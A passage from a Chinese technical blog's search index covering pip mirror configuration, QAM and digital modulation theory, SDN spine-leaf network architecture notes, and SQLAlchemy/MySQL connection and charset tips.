class=\"line\">    https://pypi.python.org/simple/</span><br><span class=\"line\"></span><br><span class=\"line\">[install]</span><br><span class=\"line\">trusted-host = tuna.tsinghua.edu.cn</span><br><span class=\"line\">    pypi.douban.com</span><br><span class=\"line\">    mirrors.ustc.edu.cn</span><br><span class=\"line\">    python.org</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://liaoxuefeng.com/books/python/introduction/index.html\">Python教程 - 廖雪峰</a></li>\n<li><a href=\"https://l-fay.github.io/2020/11/27/anaconda00/\">pip 换源的注意事项</a></li>\n</ul>\n<h3 id=\"库函数\"><a href=\"#库函数\" class=\"headerlink\" title=\"库函数\"></a>库函数</h3><ul>\n<li><a href=\"https://www.runoob.com/numpy/numpy-tutorial.html\">NumPy 教程 - 菜鸟教程</a></li>\n<li><a href=\"https://wizardforcel.gitbooks.io/matplotlib-user-guide/content/7.2.html\">在 Python shell 中使用 Matplotlib</a></li>\n<li><a href=\"https://blog.csdn.net/sinat_41942180/article/details/134036932\">Matplotlib教程</a></li>\n</ul>\n"},{"title":"QAM - 正交振幅调制的技术原理","url":"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/","content":"<p>在信号处理中，通常将传感器从其他物理量转换来的电信号称为基带信号（baseband signal）。基带信号包含了原始信号的所有频谱成分，通常在很低的频率范围内，例如麦克风的电子输出等。</p>\n<p>调制（modulation）是一种将一个或多个周期性的载波（carrier wave）混入基带信号的技术，常用于无线电波的传播与通信、利用电话线的数据通信等各方面。解调（demodulation）是调制的逆过程，即在接收端把已搬到给定信道通带内的频谱还原为基带信号的过程。</p>\n<p>调制 &#x2F; 解调技术的目的是为了实现信号频谱的<strong>搬移</strong>，从而有利于信号的传送，并且使频谱资源得到充分利用。例如，天线尺寸为信号的十分之一或更大些，信号才能有效的被辐射。然而，对于语音信号来说，相应的天线尺寸要在几十公里以上！因此就需要调制过程将信号频谱搬移到较高的频率范围。此外，调制 &#x2F; 解调技术还可以将相同频率范围的信号分别依托于不同频率的载波上，接收机就可以分离出所需的频率信号，不致互相干扰。这也是在同一信道中实现多路复用的基础。</p>\n<blockquote>\n<p>载波的频率通常<strong>远高于</strong>基带信号的频率范围。</p>\n</blockquote>\n<h2 id=\"一、调制技术的分类\"><a href=\"#一、调制技术的分类\" class=\"headerlink\" title=\"一、调制技术的分类\"></a>一、调制技术的分类</h2><p>按照载波信号（被调信号）的类型，可以分为模拟载波（Analog carrier，通常为正弦波），或着数字载波（Digital carrirt，通常为脉冲信号）。</p>\n<p>按照基带信号（调制信号）的类型，可以分为模拟调制（Analog data，连续型信息，例如广播电台）与数字调制（Digital data，离散型信息，例如GSM、WiFI等）。</p>\n<p><img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/types-of-modulation.png\" alt=\"types-of-modulation\"></p>\n<h2 id=\"二、模拟调制方法\"><a href=\"#二、模拟调制方法\" class=\"headerlink\" title=\"二、模拟调制方法\"></a>二、模拟调制方法</h2><p>在模拟调制中，调制是连续施加在模拟载波之上，以响应模拟信息信号。<br>最常见的模拟载波是<strong>等幅单频正弦波</strong>，其优势在于它们能够直接表示实际的物理量，可以提供更自然的再现，此外技术实现比较简单成熟，成本较低，因此特别适合无线通信。数学表达式为：<br>$$C(t)&#x3D;A \\cos( \\omega_ct + \\phi_0)$$</p>\n<p>其中：$A$ 是载波幅度，$\\omega_c$ 是载波频率，$\\phi_0$ 是载波相位，调制过程中改变的就是这 3 个参数。</p>\n<ul>\n<li>AM（Amplitude Modulation，幅度调制）：载波信号的幅度根据调制信号的瞬时幅度而变化<br>  <img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/AM.png\" alt=\"AM\"></li>\n<li>FM（Frequency Modulation，频率调制）：载波信号的频率根据调制信号的瞬时幅度而变化<br>  <img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/AM+FM.gif\" alt=\"AM+FM\"></li>\n<li>PM（Phase Modulation，相位调制）：载波信号的相移根据调制信号的瞬时幅度而变化<br>  <img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/PM.gif\" alt=\"PM\"></li>\n</ul>\n<h2 id=\"三、数字调制方法\"><a href=\"#三、数字调制方法\" class=\"headerlink\" title=\"三、数字调制方法\"></a>三、数字调制方法</h2><p>在数字调制中，模拟载波信号由离散信号调制。数字调制方法可以被认为是数模（A&#x2F;D）转换，相应的解调或检测可以被认为是模数转换。载波信号的变化是从有限数量的 M 个替代符号（调制字母表）中选择的。大多数教科书将数字调制方案视为一种数字传输形式，与数据传输同义。</p>\n<h3 id=\"1-二进制数字调制\"><a href=\"#1-二进制数字调制\" class=\"headerlink\" title=\"1. 二进制数字调制\"></a>1. 二进制数字调制</h3><p>调制信号为二进制数字信号时，这种调制称为二进制数字调制。<br>与模拟调制方法类似，数字调制的最基本方法就是调幅、调相和调频。在二进制数字调制中，载波的幅度、频率或相位只有两种变化状态。</p>\n<ul>\n<li>ASK（Amplitude Shift Keying，幅移键控）：也称为 2ASK<br>  <img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/ASK.png\" alt=\"ASK\"></li>\n<li>FSK（Frequency Shift Keying，频移键控）：也称为 2FSK<br>  <img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/FSK.png\" alt=\"FSK\"></li>\n<li>PSK（Phase Shift Keying，相移键控）：也称为 2PSK<br>  <img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/PSK.png\" alt=\"PSK\"></li>\n</ul>\n<h3 id=\"2-多进制数字调制\"><a href=\"#2-多进制数字调制\" class=\"headerlink\" title=\"2. 多进制数字调制\"></a>2. 多进制数字调制</h3><p>二进制数字调制中，每一个符号只能表示 0-1 两个数值，为了提高数据传输效率，可以在一个符号内传输更多的比特，从而提高频带利用率，这就是多进制数字调制。<br>简单来说，就是把原来的 0-1 比特流进行分组，例如两个 bit 为一组映射到一个符号（symbol、码元）上，那么一个符号就有 00, 01, 11, 10 四种调制的取值。</p>\n<ul>\n<li>在码元速率（传码率）相同条件下，M 进制数字传输系统的信息速率是二进制的 $\\log_2M$ 倍，从而提高系统的有效性</li>\n<li>与此等价的，在信息速率相同条件下，M 进制码元宽度是二进制的 $\\log_2M$ 倍，因此每个码元的能量增加，而码元速率相应降低，减小了码间串扰的影响，从而提高了传输的可靠性。</li>\n<li>在接收机输入信噪比相同条件下，多进制数字传输系统的误码率相应增高，同时也增加了发射功率和实现上的复杂性。</li>\n</ul>\n<p>在数字调制中，载波参数（幅度，频率和相位）的变化由离散的数字信号决定。数字调制信号只须表示离散的调制状态，这些离散状态在矢量图上称为符号点 (symbol point)，符号点的组合称为星座图(constellation)。</p>\n<p>对于相位调制来说，二进制数字调制也称为 BPSK（Binary Phase Shift Keyring），而多进制数字调制依次为 QPSK（Quadrature Phase Shift Keying，也称 4PSK）和 8PSK。</p>\n<p><img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/8PSK.png\" alt=\"8PSK\"></p>\n<p>从其星座图分析发现：</p>\n<ul>\n<li>所有符号点平均分布在一个同心圆，圆周半径相等于信号幅度</li>\n<li>在信号幅度相同（即功率相等）的条件下，进制数 M 增加意味着相邻符号点的距离（相位差异）越小</li>\n<li>换句话说，更高阶的 PSK 调制技术将导致系统误码率增高</li>\n</ul>\n<p>因此，为了进一步提高传输效率，不适合采用高于 8PSK 的数字调制技术，而是改为 ASK + PSK 的联合调制方式！</p>\n<h2 id=\"四、QAM（Quadrature-Amplitude-Modulation，正交幅度调制）\"><a href=\"#四、QAM（Quadrature-Amplitude-Modulation，正交幅度调制）\" class=\"headerlink\" title=\"四、QAM（Quadrature Amplitude Modulation，正交幅度调制）\"></a>四、QAM（Quadrature Amplitude Modulation，正交幅度调制）</h2><p>正交幅度调制 （QAM） 是现代电信中广泛用于传输信息的数字调制方法系列和模拟调制方法的相关系列的名称。它通过使用幅移键控 （ASK） 数字调制方案或幅度调制 （AM） 模拟调制方案来改变（调制）两个载波的幅度，从而传送两个模拟消息信号或两个数字位流。两个载波的频率相同，并且彼此异相 90°，这种情况称为正交或正交。传输的信号是通过将两个载波相加来创建的。在接收器处，由于它们的正交性，两个波可以相干分离（解调）。</p>\n<p>相位调制（模拟 PM）和相移键控（数字 PSK）可以看作是 QAM 的一种特殊情况，其中传输信号的幅度是恒定的，但其相位会发生变化。这也可以扩展到频率调制 （FM） 和频移键控 （FSK），因为这些可以被视为相位调制的特例。</p>\n<p>QAM 广泛用作数字通信系统的调制方案，例如在 802.11 Wi-Fi 标准中。通过设置合适的星座图大小，QAM 可以实现任意高频谱效率，仅受通信信道的噪声水平和线性度限制。随着比特率的增加，QAM 正在光纤系统中使用;QAM16 和 QAM64 可以用三通道干涉仪进行光学仿真。</p>\n<h3 id=\"数学表达\"><a href=\"#数学表达\" class=\"headerlink\" title=\"数学表达\"></a>数学表达</h3><p>在 QAM 中，载波的振幅和相位同时受到基带信号控制，因此一个码元可以表示为：<br>$$S_k(t) &#x3D; A_k \\cos (\\omega_0t + \\theta_k) &#x3D; A_k \\cos \\theta_k \\cos \\omega_0t - A_k \\sin \\theta_k \\sin \\omega_0t$$<br>其中，$k$ 是整数，$A_k$ 和 $\\theta_k$ 分别可以取多个离散值，载波频率为 $\\omega_0$<br>令 $X_k &#x3D; A_k \\cos \\theta_k, Y_k &#x3D; -A_k \\sin \\theta_k$，则信号调制结果为：<br>$$ S_k(t) &#x3D; X_k \\cos \\omega_ot + Y_k \\sin \\omega_0t$$</p>\n<p>在接收器处，相干解调器将接收到的信号分别与余弦和正弦信号相乘，以产生接收到的 I（t） 和 Q（t） 估计值。例如：<br>低通滤波 r（t） 去除高频项（包含 4πfct），只留下 I（t） 项。此滤波信号不受 Q（t） 的影响，表明同相分量可以独立于正交分量接收。同样，我们可以将 sc（t） 乘以正弦波，然后用低通滤波器提取 Q（t）。</p>\n<h3 id=\"正交调幅法\"><a href=\"#正交调幅法\" class=\"headerlink\" title=\"正交调幅法\"></a>正交调幅法</h3><p>用两路正交的 4ASK 信号叠加，形成 16QAM 信号</p>\n<h3 id=\"复合相移法\"><a href=\"#复合相移法\" class=\"headerlink\" title=\"复合相移法\"></a>复合相移法</h3><p>用两路独立的 4PSK 信号叠加，形成 16QAM 信号。但实际很少采用。</p>\n<p><img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/QAM.png\" alt=\"QAM\"></p>\n<h3 id=\"APSK（Amplitude-and-Phase-Shift-Keyring，幅频联合键控）\"><a href=\"#APSK（Amplitude-and-Phase-Shift-Keyring，幅频联合键控）\" class=\"headerlink\" title=\"APSK（Amplitude and Phase-Shift Keyring，幅频联合键控）\"></a>APSK（Amplitude and Phase-Shift Keyring，幅频联合键控）</h3><p>幅度和相移键控 （APSK） 是一种数字调制方案，它通过调制载波的幅度和相位来传输数据。换句话说，它结合了幅度偏移键控 （ASK） 和相移键控 （PSK）。与单独的 ASK 或 PSK 相比，这允许在给定的调制阶数和信噪比下降低误码率，但代价是复杂性更高。[1]</p>\n<p>正交幅度调制 （QAM） 可以被视为 APSK 的子集，因为所有 QAM 方案都同时调制载波的幅度和相位。传统上，QAM 星座是矩形的，而 APSK 星座是圆形的，但情况并非总是如此。两者之间的区别在于它们的生产;QAM 由两个正交信号产生。与传统 QAM 相比，APSK 的优势在于可能的幅度级别数量较少，因此峰均功率比 （PAPR） 较低。[2]APSK 的低 PAPR 对放大器和信道非线性的弹性使其对卫星通信（包括 DVB-S2）特别有吸引力。[3]</p>\n<p>在 APSK 中，一如其名，幅度和相位均被调制。与 QAM 不同的是， 它的星座点分布在 I&#x2F;Q平面中的同心圆上。 这个概念被引入到卫星系统（射频功率放大器具有非线性特性）。因此需要一个能够容忍 非线性放大的调制方案（包含较少的幅度），以便更轻松地平衡这种非线性。</p>\n<p>图 19 对比了16QAM星座图和 16-APSK星座图，其中 16QAM星座图有 3 个幅度，而 16APSK星座图只有 2 个。32QAM星座图有 5 个幅度，而 32-APSK星座图 有 3 个。注意：QAM振铃的间距是不均匀的， 有的振铃间距很窄，从而加剧了非线性补偿的难度。</p>\n<p>在光纤中，APSK 可应用到非线性噪声场景中，用于改善对非线性光纤特征的容忍度。当数据速率高达 400 Gbps 及以上时，16QAM星座点间距较大，更易实施且光信噪比性能更佳，因而是首选的方案。</p>\n<p><img src=\"/2024/09/15/QAM-%E6%AD%A3%E4%BA%A4%E6%8C%AF%E5%B9%85%E8%B0%83%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/APSK.png\" alt=\"APSK\"></p>\n<hr>\n<h2 id=\"附录一：数字通信传输\"><a href=\"#附录一：数字通信传输\" class=\"headerlink\" title=\"附录一：数字通信传输\"></a>附录一：数字通信传输</h2><p>数字通信传输方法主要有两大类：基带（baseband）和通带（passband）。</p>\n<p>在基带传输中使用线路编码，从而产生脉冲序列或数字脉冲幅度调制 （PAM） 信号。这通常用于未过滤的电线，例如光纤电缆和短距离铜链路，例如：V.29 （EIA&#x2F;TIA-232）、V.35、IEEE 802.3、SONET&#x2F;SDH。</p>\n<p>在通带传输中采用数字调制方法，以便在某些带通滤波通道中仅使用有限的频率范围。通带传输通常用于无线通信和带通滤波通道，例如 POTS 线路。它还允许频分多路复用。数字 bitstream 首先转换为等效的 baseband 信号，然后转换为 RF 信号。在接收器侧，解调器用于检测信号并反转调制过程。</p>\n<p>用于调制和解调的组合设备就称为 <a href=\"https://en.wikipedia.org/wiki/Modem\">Modem - modulator &amp;demodulator</a>。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://en.wikipedia.org/wiki/Modulation\">Modulation - Wiki</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/594337231\">星座图通信原理</a></li>\n<li><a href=\"https://telecom.altanai.com/tag/qam/\">Wave Modulation – analog and digital</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/517843859\">信号调制与解调</a></li>\n<li><a href=\"https://blog.csdn.net/aixdm/article/details/108135653\">给“小白”图示讲解OFDM的原理</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"%E6%95%B0%E5%AD%97%E4%BF%A1%E5%8F%B7%E7%9A%84%E8%BD%BD%E6%B3%A2%E4%BC%A0%E8%BE%93.pdf\">数字信号的载波传输</a></li>\n<li><a href=\"qam.pdf\">QAM Demodulation</a></li>\n</ul>\n<h3 id=\"视频教材\"><a href=\"#视频教材\" class=\"headerlink\" title=\"视频教材\"></a>视频教材</h3><ul>\n<li><a href=\"https://www.bilibili.com/video/BV1mK421Y7jB/?spm_id_from=333.999.0.0&vd_source=735a6376f6214c7b974a1074096ba0fa\">MQAM调制原理最强解读</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1Xu4y1J77o/?spm_id_from=333.999.0.0&vd_source=735a6376f6214c7b974a1074096ba0fa\">QAM 通信原理1 - 大连理工大学</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1Ge411C7ee/?spm_id_from=333.788.recommend_more_video.-1&vd_source=735a6376f6214c7b974a1074096ba0fa\">QAM 通信原理2 - 大连理工大学</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1Zb4y1z7Tj/?spm_id_from=333.999.0.0&vd_source=735a6376f6214c7b974a1074096ba0fa\">正交相移键控 (QPSK) BPSK 和 QPSK QPSK 波形（数字调制技术）</a></li>\n</ul>\n"},{"title":"SDN学习笔记之一","url":"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/","content":"<h2 id=\"传统的三层网络架构\"><a href=\"#传统的三层网络架构\" class=\"headerlink\" title=\"传统的三层网络架构\"></a>传统的三层网络架构</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/core-aggregate-access.png\" class=\"\" title=\"传统的三层网络架构\">\n\n<p>特点：</p>\n<ul>\n<li>每个服务器两个物理网卡，直连到两个置顶交换机做物理高可用</li>\n<li>汇聚层和接入层走二层交换，和核心层走三层路由</li>\n<li>所有 OpenStack 网关配置在核心层路由器</li>\n<li>防火墙和核心路由器直连，做一些安全策略</li>\n</ul>\n<h2 id=\"简化的大二层网络架构\"><a href=\"#简化的大二层网络架构\" class=\"headerlink\" title=\"简化的大二层网络架构\"></a>简化的大二层网络架构</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/spine-leaf.png\" class=\"\" title=\"简化的大二层网络架构\">\n\n<p>Spine-Leaf 是 full-mesh 连接，它可以带来如下几个好处：</p>\n<ul>\n<li><p>转发路径更短。以图 7 的 Spine-Leaf（两级 Clos 架构）为例，任何两台服务器经过三跳（Leaf1 -&gt; Spine -&gt; Leaf2）就可以到达，延迟更低，并且可保障（可以按跳数精确计算出来）。</p>\n</li>\n<li><p>水平可扩展性更好，任何一层有带宽或性能瓶颈，只需新加一台设备，然后跟另一层的所有设备直连。</p>\n</li>\n<li><p>所有设备都是 active 的，一个设备挂掉之后，影响面比三层模型里挂掉一个设备小得多。</p>\n</li>\n</ul>\n<p>宿主机方面，我们升级到了 10G 和 25G 的网卡。</p>\n<h2 id=\"SDN的控制平面和数据平面\"><a href=\"#SDN的控制平面和数据平面\" class=\"headerlink\" title=\"SDN的控制平面和数据平面\"></a>SDN的控制平面和数据平面</h2><ul>\n<li>数据平面基于 VxLAN，控制平面基于 MP-BGP EVPN 协议，在设备之间同步控制平面信息。</li>\n<li>网关是分布式的，每个 leaf 节点都是网关。</li>\n<li>VxLAN 和 MP-BGP EVPN 都是 RFC 标准协议，更多信息参考 [2]。</li>\n<li>VxLAN 的封装和解封装都在 leaf 完成，leaf 以下是 VLAN 网络，以上是 VxLAN 网络。</li>\n<li>这套方案在物理上支持真正的租户隔离。</li>\n</ul>\n<img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/spine-leaf-2.png\" class=\"\" title=\"大二层网络的整体架构\">\n\n<p>图 9 是我们软件 + 硬件的网络拓扑：</p>\n<p>1）以 leaf 为边界，leaf 以下是 underlay，走 VLAN；上面 overlay，走 VxLAN</p>\n<p>2）underlay 由 neutron、OVS 和 neutron OVS agent 控制；overlay 是 CNC 控制</p>\n<p>3）Neutron 和 CNC 之间通过 plugin 集成</p>\n<h2 id=\"SDN控制器的两种模式\"><a href=\"#SDN控制器的两种模式\" class=\"headerlink\" title=\"SDN控制器的两种模式\"></a>SDN控制器的两种模式</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/SDN%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F.png\" class=\"\" title=\"SDN控制器的两种工作模式对比\">\n\n<p>从控制器是否参与转发设备的的转发控制来看，当前主要有两种控制器类型:</p>\n<h3 id=\"弱控制模式\"><a href=\"#弱控制模式\" class=\"headerlink\" title=\"弱控制模式\"></a>弱控制模式</h3><ul>\n<li><p>弱控制模式下，控制平面基于网络设备自学习，控制器不在转发平面，仅负责配 置下发，实现自动部署。主要解决网络虚拟化，提供适应应用的虚拟网络。</p>\n</li>\n<li><p>弱控制模式的优点是转发控制面下移，减轻和减少对控制器的依赖。</p>\n</li>\n</ul>\n<h3 id=\"强控制模式\"><a href=\"#强控制模式\" class=\"headerlink\" title=\"强控制模式\"></a>强控制模式</h3><ul>\n<li><p>在强控制模式下，控制器负责整个网络的集中控制，体现SDN集中管理的优势。</p>\n</li>\n<li><p>基于openflow的强控制使得网络具备更多的灵活性和可编程性。除了能够给用 户提供适合应用需要的网络，还可以集成FW等提供安全方案;可以支持混合 Overlay 模型，通过控制器同步主机和拓扑信息, 将各种异构的转发模型同一处理;可以提供基于 openflow 的服务链功能对安全服务进行编排，可以提供更为灵活的网络诊断手段，如虚机仿真和雷达探测等。</p>\n</li>\n</ul>\n<p>用户可能会担心强控制模式下控制器全部故障对网络转发功能的影响，这个影响因素可以通过下述两点来降低和消除:</p>\n<ol>\n<li>通过控制器集群增加控制器可靠性，避免单点故障</li>\n<li>逃生机制:设备与所有控制器失联后，切换为自转模式，业务不受影响。</li>\n</ol>\n<hr>\n<h2 id=\"附录1-标准的openstack-provider-network\"><a href=\"#附录1-标准的openstack-provider-network\" class=\"headerlink\" title=\"附录1:标准的openstack-provider-network\"></a>附录1:标准的openstack-provider-network</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/openstack-provider-network.png\" class=\"\" title=\"标准的Openstack Provider Network的整体架构\">\n\n<h2 id=\"附录2-简化的openstack-provider-network\"><a href=\"#附录2-简化的openstack-provider-network\" class=\"headerlink\" title=\"附录2:简化的openstack-provider-network\"></a>附录2:简化的openstack-provider-network</h2><img src=\"/2019/07/05/SDN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%80/%E7%AE%80%E5%8C%96%E7%9A%84openstack-provider-network.png\" class=\"\" title=\"简化的Openstack Provider Network的整体架构\">\n"},{"title":"Sqlalchemy的几个小问题","url":"/2020/12/16/Sqlalchemy%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/","content":"<h2 id=\"改写为SQLALCHEMY\"><a href=\"#改写为SQLALCHEMY\" class=\"headerlink\" title=\"改写为SQLALCHEMY\"></a>改写为SQLALCHEMY</h2><h2 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h2><ul>\n<li><p>pyecharts &#x3D;&#x3D; 0.5.3</p>\n</li>\n<li><p>python3不再支持 mysql库了，需要使用pymysql；<br>修改为engine&#x3D;create_engine(‘mysql+pymysql:&#x2F;&#x2F;root:password@localhost:3306&#x2F;test’)就可以了</p>\n</li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">&gt;</span><span class=\"language-bash\">&gt;&gt; str</span></span><br><span class=\"line\">&#x27;2020-12-20&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\">&gt;</span><span class=\"language-bash\">&gt;&gt; atime = time.mktime(time.strptime(str, <span class=\"string\">&#x27;%Y-%m-%d&#x27;</span>))</span></span><br><span class=\"line\"><span class=\"meta prompt_\">&gt;</span><span class=\"language-bash\">&gt;&gt; atime</span></span><br><span class=\"line\">1608393600.0</span><br><span class=\"line\"><span class=\"meta prompt_\">&gt;</span><span class=\"language-bash\">&gt;&gt; time.ctime(atime)</span></span><br><span class=\"line\">&#x27;Sun Dec 20 00:00:00 2020&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><code>now.timestamp()</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">show</span> variables <span class=\"keyword\">like</span> <span class=\"string\">&#x27;character_set_%&#x27;</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">--------------------------+----------------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> Variable_name            <span class=\"operator\">|</span> <span class=\"keyword\">Value</span>                      <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">--------------------------+----------------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_client     <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_connection <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_database   <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_filesystem <span class=\"operator\">|</span> <span class=\"type\">binary</span>                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_results    <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_server     <span class=\"operator\">|</span> latin1                     <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_set_system     <span class=\"operator\">|</span> utf8                       <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span> character_sets_dir       <span class=\"operator\">|</span> <span class=\"operator\">/</span>usr<span class=\"operator\">/</span>share<span class=\"operator\">/</span>mysql<span class=\"operator\">/</span>charsets<span class=\"operator\">/</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">--------------------------+----------------------------+</span></span><br><span class=\"line\"><span class=\"number\">8</span> <span class=\"keyword\">rows</span> <span class=\"keyword\">in</span> <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql<span class=\"operator\">&gt;</span> status</span><br><span class=\"line\"><span class=\"comment\">--------------</span></span><br><span class=\"line\">mysql  Ver <span class=\"number\">14.14</span> Distrib <span class=\"number\">5.7</span><span class=\"number\">.32</span>, <span class=\"keyword\">for</span> Linux (x86_64) <span class=\"keyword\">using</span>  EditLine wrapper</span><br><span class=\"line\"></span><br><span class=\"line\">Connection id:          <span class=\"number\">247</span></span><br><span class=\"line\"><span class=\"keyword\">Current</span> database:       cmccb2b</span><br><span class=\"line\"><span class=\"keyword\">Current</span> <span class=\"keyword\">user</span>:           root<span class=\"variable\">@localhost</span></span><br><span class=\"line\">SSL:                    <span class=\"keyword\">Not</span> <span class=\"keyword\">in</span> use</span><br><span class=\"line\"><span class=\"keyword\">Current</span> pager:          stdout</span><br><span class=\"line\"><span class=\"keyword\">Using</span> outfile:          <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">Using</span> delimiter:        ;</span><br><span class=\"line\">Server version:         <span class=\"number\">5.7</span><span class=\"number\">.32</span> MySQL Community Server (GPL)</span><br><span class=\"line\">Protocol version:       <span class=\"number\">10</span></span><br><span class=\"line\">Connection:             Localhost via UNIX socket</span><br><span class=\"line\">Server characterset:    latin1</span><br><span class=\"line\">Db     characterset:    latin1</span><br><span class=\"line\">Client characterset:    latin1</span><br><span class=\"line\">Conn.  characterset:    latin1</span><br><span class=\"line\">UNIX socket:            <span class=\"operator\">/</span>var<span class=\"operator\">/</span>run<span class=\"operator\">/</span>mysqld<span class=\"operator\">/</span>mysqld.sock</span><br><span class=\"line\">Uptime:                 <span class=\"number\">2</span> days <span class=\"number\">3</span> hours <span class=\"number\">11</span> min <span class=\"number\">59</span> sec</span><br><span class=\"line\"></span><br><span class=\"line\">Threads: <span class=\"number\">9</span>  Questions: <span class=\"number\">5348</span>  Slow queries: <span class=\"number\">0</span>  Opens: <span class=\"number\">294</span>  Flush tables: <span class=\"number\">1</span>  <span class=\"keyword\">Open</span> tables: <span class=\"number\">182</span>  Queries <span class=\"keyword\">per</span> <span class=\"keyword\">second</span> avg: <span class=\"number\">0.029</span></span><br><span class=\"line\"><span class=\"comment\">--------------</span></span><br></pre></td></tr></table></figure>\n\n<p>SQLALCHEMY_DATABASE_URI &#x3D; ‘mysql+pymysql:&#x2F;&#x2F;root:123456@localhost:3306&#x2F;cmccb2b?charset&#x3D;utf8’</p>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><p><a href=\"https://flask-sqlalchemy.palletsprojects.com/en/2.x/\">Flask-SQLAlchemy Home</a></p>\n</li>\n<li><p><a href=\"https://www.osgeo.cn/sqlalchemy/orm/index.html\">SQLAlchemy中文文档</a></p>\n</li>\n<li><p><a href=\"https://docs.sqlalchemy.org/en/13/core/engines.html#database-urls\">SQLAlchemy Home 